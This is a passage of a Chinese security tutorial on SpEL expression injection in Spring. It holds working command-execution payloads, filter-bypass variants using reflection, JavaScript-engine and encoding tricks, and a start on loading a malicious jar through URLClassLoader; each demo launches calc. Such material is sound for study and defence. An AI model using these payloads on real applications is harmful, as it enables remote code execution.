class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-comment">//解析表达式</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello&#x27; + &#x27; Drunkbaby&#x27;).concat(#end)&quot;</span>);<br><span class="hljs-comment">//构造上下文</span><br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br><span class="hljs-comment">//求值</span><br>context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);  <br>System.out.println(expression.getValue(context));<br></code></pre></td></tr></table></figure><p>具体步骤如下：</p><p>1、创建解析器：SpEL 使用 <code>ExpressionParser</code> 接口表示解析器，提供 <code>SpelExpressionParser</code> 默认实现；<br>2、解析表达式：使用 <code>ExpressionParser</code> 的 <code>parseExpression</code> 来解析相应的表达式为 <code>Expression</code> 对象；<br>3、构造上下文：准备比如变量定义等等表达式需要的上下文数据；<br>4、求值：通过 <code>Expression</code> 接口的 <code>getValue</code> 方法根据上下文获得表达式值；</p><p><strong>主要接口：</strong></p><ul><li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 <code>org.springframework.expression.spel.standard</code> 包中的 <code>SpelExpressionParser</code> 类，使用 <code>parseExpression</code> 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li><li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 <code>org.springframework.expression.spel.support</code> 包中的 <code>StandardEvaluationContext</code> 类，使用 <code>setRootObject</code> 方法来设置根对象，使用 <code>setVariable</code> 方法来注册自定义变量，使用 <code>registerFunction</code> 来注册自定义函数等等。</li><li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 <code>org.springframework.expression.spel.standard</code> 包中的 <code>SpelExpression</code>，提供 <code>getValue</code> 方法用于获取表达式值，提供 <code>setValue</code> 方法用于设置对象值。</li></ul><h3 id="2-3-1-Demo"><a href="#2-3-1-Demo" class="headerlink" title="2.3.1 Demo"></a>2.3.1 Demo</h3><p>程序会将这里传入 <code>parseExpression()</code> 函数的字符串参数 spel  作为 SpEL 表达式来解析，而无需通过 <code>#{}</code> 符号来注明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpressionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210056.png" alt="img"></p><h3 id="2-3-2-类实例化"><a href="#2-3-2-类实例化" class="headerlink" title="2.3.2 类实例化"></a>2.3.2 类实例化</h3><p>类实例化同样使用 Java 关键字 new，类名必须是全限定名，但 <code>java.lang</code> 包内的类型除外。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.util.Date()&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210814.png" alt="img"></p><h1 id="3、SpEL-表达式注入漏洞"><a href="#3、SpEL-表达式注入漏洞" class="headerlink" title="3、SpEL 表达式注入漏洞"></a>3、SpEL 表达式注入漏洞</h1><h2 id="3-1-漏洞原理"><a href="#3-1-漏洞原理" class="headerlink" title="3.1 漏洞原理"></a>3.1 漏洞原理</h2><p><code>SimpleEvaluationContext</code> 和 <code>StandardEvaluationContext</code> 是 SpEL 提供的两个 <code>EvaluationContext</code>：</p><ul><li>SimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。</li><li>StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li></ul><p><code>SimpleEvaluationContext</code> 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 <code>StandardEvaluationContext</code> 是支持全部 SpEL 语法的。</p><p>由前面的 类类型表达式 知道，SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 <code>T(Type)</code> 来调用任意类方法。这是因为在不指定 <code>EvaluationContext</code> 的情况下默认采用的是 <code>StandardEvaluationContext</code>，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p>例如 2.3 中的 Demo ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpressionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210366.png" alt="img"></p><h2 id="3-2-通过反射的方式进行-SpEL-注入"><a href="#3-2-通过反射的方式进行-SpEL-注入" class="headerlink" title="3.2 通过反射的方式进行 SpEL 注入"></a>3.2 通过反射的方式进行 SpEL 注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectBypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(String).getClass().forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-基础-Poc"><a href="#3-3-基础-Poc" class="headerlink" title="3.3 基础 Poc"></a>3.3 基础 Poc</h2><p>除了常见的 <code>Runtime</code> 的命令执行方法，还有<code>ProcessBuilder</code>进行命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Runtime</span><br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br>T(Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br><span class="hljs-comment">// ProcessBuilder</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(&#123;<span class="hljs-string">&#x27;calc&#x27;</span>&#125;).start()<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(&#123;<span class="hljs-string">&#x27;calc&#x27;</span>&#125;).start()<br></code></pre></td></tr></table></figure><h2 id="3-4-基础-Bypass"><a href="#3-4-基础-Bypass" class="headerlink" title="3.4 基础 Bypass"></a>3.4 基础 Bypass</h2><h3 id="3-4-1-常见的-Bypass-技巧"><a href="#3-4-1-常见的-Bypass-技巧" class="headerlink" title="3.4.1  常见的 Bypass 技巧"></a>3.4.1  常见的 Bypass 技巧</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">// 反射调用</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br> <br><span class="hljs-comment">// 同上，需要有上下文环境</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br> <br><span class="hljs-comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br> <br><span class="hljs-comment">// 同上，需要有上下文环境</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br> <br><span class="hljs-comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">99</span>&#125;)).start()<br> <br><span class="hljs-comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br>T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">99</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)))<br></code></pre></td></tr></table></figure><h3 id="3-4-2-JavaScript-Engine-Bypass"><a href="#3-4-2-JavaScript-Engine-Bypass" class="headerlink" title="3.4.2 JavaScript Engine Bypass"></a>3.4.2 JavaScript Engine Bypass</h3><p>使用 JS 引擎进行绕过</p><p>获取所有 JS 引擎信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.JSBypass;<br><br><span class="hljs-keyword">import</span> javax.script.ScriptEngineFactory;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">scriptEngineManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br>        List&lt;ScriptEngineFactory&gt; factories = scriptEngineManager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> (ScriptEngineFactory factory : factories) &#123;<br>            System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>            );<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210329.png" alt="img"></p><p>通过结果中的 Names，我们知道了所有的 js 引擎名称故 <code>getEngineByName</code> 的参数可以填 <code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,举个例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">sem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br><span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> sem.getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>);<br>System.out.println(engine.eval(<span class="hljs-string">&quot;2+1&quot;</span>));<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// JavaScript引擎通用PoC</span><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)<br>  <br><span class="hljs-comment">// JavaScript引擎+反射调用</span><br>T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)),)<br> <br><span class="hljs-comment">// JavaScript引擎+URL编码</span><br><span class="hljs-comment">// 其中URL编码内容为：</span><br><span class="hljs-comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br>T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="hljs-string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.JSBypass;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//String spel = &quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la\&quot;+\&quot;ng.Run\&quot;+\&quot;time.getRu\&quot;+\&quot;ntime().ex\&quot;+\&quot;ec(s);\&quot;)\n&quot;;</span><br><br>        <span class="hljs-comment">//String spel = &quot;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;cmd\&quot;,\&quot;/C\&quot;,\&quot;calc\&quot;&#125;)),)\n&quot;;</span><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(T(java.net.URLDecoder).decode(\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\&quot;)),)&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210399.png" alt="img"></p><h2 id="3-5-通过类加载器构造-PoC-Bypass"><a href="#3-5-通过类加载器构造-PoC-Bypass" class="headerlink" title="3.5  通过类加载器构造 PoC &amp; Bypass"></a>3.5  通过类加载器构造 PoC &amp; Bypass</h2><h3 id="3-5-1-UrlClassloader"><a href="#3-5-1-UrlClassloader" class="headerlink" title="3.5.1 UrlClassloader"></a>3.5.1 UrlClassloader</h3><p>这个方法就是通过远程类加载</p><h4 id="Windons"><a href="#Windons" class="headerlink" title="Windons:"></a>Windons:</h4><p>目标：现在有一个 Spring Boot 服务，它的 <code>/eval?exp=</code> 路径下可以进行 SpEL 表达式注入，我们要通过注入构造 <code>URLClassLoader</code> 来远程加载类 <code>http://127.0.0.1:8999/Exp.jar</code> 达到执行恶意类的目的</p><p>1） 首先构造一个恶意类</p><p>弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exp</span><span class="hljs-params">(String p)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c start calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2） 编译打包为 Exp.jar</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">javac <span class="hljs-built_in">Exp</span>.java<br>jar cvf <span class="hljs-built_in">Exp</span>.jar <span class="hljs-built_in">Exp</span>.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210485.png" alt="img"></p><p>3） 用 python 本地启动 http  服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">8999</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210385.png" alt="img"></p><p> 4） 准备 Spring Boot SpEL 漏洞 Demo  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 